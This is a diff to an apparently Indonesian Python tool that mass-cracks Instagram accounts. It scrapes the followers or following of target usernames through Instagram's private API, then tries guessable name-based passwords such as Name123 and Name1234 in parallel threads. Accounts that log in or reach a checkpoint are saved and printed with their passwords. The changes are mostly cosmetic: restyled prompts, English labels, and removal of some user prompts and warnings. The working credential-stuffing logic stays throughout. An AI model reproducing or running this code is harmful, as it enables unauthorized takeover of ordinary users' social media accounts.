@@ -674,12 +674,12 @@ class instagram:
 	       return useragent
 
 	def passwordAPI(self,xnx):
-		idtar=f' [•] TOTAL ID  : [green]{len(internal)} [/green]'
+		idtar=f'╚═➣TOTAL ID  : [green]{len(internal)} [/green]'
 		idtar1=nel(idtar,style='')
 		sol().print(idtar1)
-		komb='[cyan][1] [green]Name,Name123,Name1234\n[cyan][2] [yellow]Name,Name123,Name1234,Name12345\n[cyan][3] [red]Name,Name123,Name1234,Name12345,Name123456\n[cyan][4] [purple]Password Manual'
+		komb='[1] Name,Name123,Name1234\n[2] Name,Name123,Name1234,Name12345\n[3] Name,Name123,Name1234,Name12345,Name123456\n[4] Password Manual'
 		sol().print(nel(komb,title='[green]List Password[/green]'))
-		c=input(f'{N}[•] Masukan Pilihan :{C} ')
+		c=input(f'╚═➣ 𝐄𝐍𝐓𝐄𝐑 : ')
 		if c=='1':
 		      self.generateAPI(xnx,c)
 		elif c=='2':
@@ -700,12 +700,10 @@ class instagram:
 			self.passwordAPI(xnx)
 
 	def generateAPI(self,user,o,zx=''):
-		io=f'[•] Hasil [green]OK[/green] disimpan ke: [green]result/{day}.txt[/green]\n[•] Hasil [yellow]CP[/yellow] disimpan ke: [yellow]result/{day}.txt[/yellow]'
+		io=f'╚═➣ OK [green]result/{day}.txt[/green]\n╚═➣ CP [yellow]result/{day}.txt[/yellow]'
 		oi = nel(io, style='')
-		cetak(nel(oi, title='[green]CRACK DIMULAI[/green]'))
-		ipku=' [•] Nyalakan Mode Pesawat Jika Tidak Mendapatkan Hasil'
-		ipku1=nel(ipku,style='')
-		sol().print(ipku1)
+		cetak(nel(oi, title='[green]CRACK EMAD[/green]'))
+		
 		with ThreadPoolExecutor(max_workers=15) as shinkai:
 			for i in user:
 				try:
@@ -764,7 +762,7 @@ class instagram:
 		ses=requests.Session()
 		ua=random.choice(ugen5)
 		warna = random.choice([M, H, K, U, O,])
-		sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H} OK : - {len(success)}{C}  {K} CP : - {len(checkpoint)} {N}"),sys.stdout.flush()
+		sys.stdout.write(f"\r╚═➣{loop}/{len(internal)}{C} {H} OK:{len(success)}{C} {K} CP:{len(checkpoint)} {N}"),sys.stdout.flush()
 		try:
 			for pw in pas:
 				ncek=random.randint(1000000000, 99999999999)
@@ -800,7 +798,7 @@ class instagram:
 				ncek=json.loads(respon.text)
 				if 'userId' in str(ncek):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
-					io=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {user_agentAPI()}'
+					io=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nFollowers : {pengikut}\nFolloweng: {mengikut}\nPost      : {postingan}'
 					oi = nel(io, style='green')
 					print('\n')
 					cetak(nel(oi,style='',title='\r[green]•[/][white]•[/][green]•[/][green]LIVE •[/][white]•[/][green]•[/]'))
@@ -810,7 +808,7 @@ class instagram:
 
 				elif 'checkpoint_url' in str(ncek):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
-					io=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {user_agentAPI()}'
+					io=f'\rName      : {nama}\nUsername  : {user}\nPassword  : {pw}\nFollowers : {pengikut}\nFolloweng: {mengikut}\nPost      : {postingan}'
 					oi = nel(io, style='yellow')
 					print('\n')
 					cetak(nel(oi,style='', title='\r[yellow]•[/][white]•[/][yellow]•[/][yellow]CHECKPOINT •[/][white]•[/][yellow]•[/]'))
@@ -928,11 +926,7 @@ class instagram:
 			self.passwordAPI(name)
 
 		elif c in ('1','01'):
-			pr='[cyan][•] [green]CRACK DARI PENGIKUT'
-			po=nel(pr,style='')
-			sol().print(po)
-			#massal(self)
-			mas=input('  [•] Apakah anda ingin crack masal? y/t >  ')
+			mas=('y')
 			if mas in ['y','Y']:
 				masal(self)
 			elif mas in ['t','T']:
@@ -942,10 +936,7 @@ class instagram:
 
 
 		elif c in ('2','02'):
-			pr='[cyan][•][/cyan] [green]CRACK DARI MENGIKUTI[/green]'
-			po=nel(pr,style='')
-			sol().print(po)
-			mas=input('  [•] Apakah anda ingin crack masal? y/t >  ')
+			mas=('y')
 			if mas in ['y','Y']:
 				mengi(self)
 			elif mas in ['t','T']:
@@ -1099,20 +1090,11 @@ def getkey():
 def mengi(self):
 			try:
 				menudump.append('mengikuti')
-				mas='[!] Target harus bersifat publik jangan privat'
-				mas1=nel(mas,style='')
-				sol().print(mas1)
-				m=int(input(f'\n{N}[?{N}] Masukan jumlah target: {N}'))
+				m=int('2')
 			except:m=1
 			for t in range(m):
 				t +=1
-				so=f'# TOTAL ID :{len(internal)}'
-				pi=mark(so,style='green')
-				sol().print(pi)
-				nama=input(f' [{t}] Masukan Username : ')
-				pr=f' Sedang Mengumpulkan ID : [green]{m}[/green]'
-				u=nel(pr,style="")
-				sol().print(u)
+				nama=input(f'╚═➣ 𝐄𝐍𝐓𝐄𝐑 𝐔𝐒𝐄𝐑 [{t}] : ')
 				id=self.idAPI(self.cookie,nama)
 				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
 			self.passwordAPI(info)
@@ -1136,20 +1118,11 @@ def meng(self):
 def masal(self):
 			try:
 				menudump.append('pengikut')
-				mas='[!] Target harus bersifat publik jangan privat'
-				mas1=nel(mas,style='')
-				sol().print(mas1)
-				m=int(input(f'\n  {H}[?{H}] Masukan jumlah target: {N}'))
+				m=int('2')
 			except:m=1
 			for t in range(m):
 				t +=1
-				so=f'# TOTAL ID :{len(internal)}'
-				pi=mark(so,style='green')
-				sol().print(pi)
-				nama=input(f' [{t}] Masukan Username : ')
-				pr=f' Sedang Mengumpulkan ID : [green]{m}[/green]'
-				u=nel(pr,style="")
-				sol().print(u)
+				nama=input(f'╚═➣ 𝐄𝐍𝐓𝐄𝐑 𝐔𝐒𝐄𝐑 [{t}] : ')
 				id=self.idAPI(self.cookie,nama)
 				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
 			self.passwordAPI(info)
